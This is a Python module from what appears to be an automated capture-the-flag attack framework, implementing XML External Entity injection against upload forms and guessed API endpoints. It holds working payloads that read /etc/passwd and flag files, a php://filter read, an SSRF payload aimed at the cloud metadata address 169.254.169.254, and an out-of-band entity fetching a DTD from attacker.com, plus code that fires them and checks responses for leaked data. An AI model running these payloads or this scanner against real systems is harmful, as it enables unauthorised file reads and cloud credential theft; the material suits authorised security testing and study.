"""
XXE Module — XML External Entity Injection
Targets XML upload endpoints, SOAP services, and SVG upload
"""
from backend.core.base_module import BaseModule
from backend.core.parser import Parser
from backend.core.flag_hunter import FlagHunter


class XXEModule(BaseModule):
    MODULE_NAME = "xxe"
    DESCRIPTION = "XML External Entity Injection"

    XXE_PAYLOADS = [
        # Basic file read
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
         '"file:///etc/passwd">]><root>&xxe;</root>'),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
         '"file:///flag.txt">]><root>&xxe;</root>'),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
         '"file:///flag">]><root>&xxe;</root>'),
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
         '"file:///etc/hosts">]><root>&xxe;</root>'),
        # PHP filter (for PHP apps)
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
         '"php://filter/convert.base64-encode/resource=/flag.txt">]>'
         '<root>&xxe;</root>'),
        # SSRF via XXE
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM '
         '"http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>'),
        # OOB (out-of-band) hint
        ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM '
         '"http://attacker.com/evil.dtd"> %xxe;]><root>test</root>'),
    ]

    XML_CONTENT_TYPES = [
        "application/xml",
        "text/xml",
        "application/x-www-form-urlencoded",
    ]

    def run(self) -> dict:
        self.log(f"[XXE] Starting scan on {self.target_url}")
        resp = self.requester.get()
        if resp is None:
            self.results["status"] = "unreachable"
            return self.results

        flags = FlagHunter.hunt(resp.text)
        [self.add_flag(f) for f in flags]

        # Look for XML/file upload forms
        forms = Parser.extract_forms(resp.text)
        xml_forms = [f for f in forms if self._is_xml_form(f)]
        self.log(f"[XXE] Found {len(xml_forms)} potential XML form(s)")

        for form in xml_forms:
            self._test_xxe_form(form)

        # Direct POST with XML content type
        self._probe_xml_endpoints()

        if self.results["status"] == "pending":
            self.results["status"] = "not_vulnerable"
        return self.results

    def _is_xml_form(self, form) -> bool:
        for inp in form["inputs"]:
            if any(kw in (inp.get("name") or "").lower()
                   for kw in ("xml", "data", "content", "body", "upload",
                               "file", "import", "svg")):
                return True
        return False

    def _test_xxe_form(self, form):
        action = form["action"] or self.target_url
        if not action.startswith("http"):
            action = self.target_url.rstrip("/") + "/" + action.lstrip("/")

        for payload in self.XXE_PAYLOADS:
            # POST raw XML
            r = self.requester.post(
                action,
                data=payload,
                headers={"Content-Type": "application/xml"})
            if r is None:
                continue
            if any(sig in r.text for sig in
                   ["root:x:", "daemon:", "flag{", "FLAG{",
                    "localhost", "127.0.0.1"]):
                self.add_vuln({"type": "xxe", "payload": payload[:80]})
                flags = FlagHunter.hunt(r.text)
                [self.add_flag(f) for f in flags]
                self.log("[XXE] XXE confirmed!")
                return

    def _probe_xml_endpoints(self):
        """Try XML POST on /upload, /api/parse, /import etc."""
        endpoints = ["/upload", "/api/parse", "/import", "/api/xml",
                     "/parse", "/api/upload", "/api/import"]
        for ep in endpoints:
            url = self.target_url.rstrip("/") + ep
            for payload in self.XXE_PAYLOADS[:3]:
                r = self.requester.post(
                    url, data=payload,
                    headers={"Content-Type": "application/xml"})
                if r and r.status_code not in (404, 405):
                    flags = FlagHunter.hunt(r.text)
                    if flags:
                        [self.add_flag(f) for f in flags]
                        self.add_vuln({"type": "xxe_endpoint",
                                       "endpoint": ep, "flags": flags})
                        self.log(f"[XXE] Endpoint hit: {ep}")
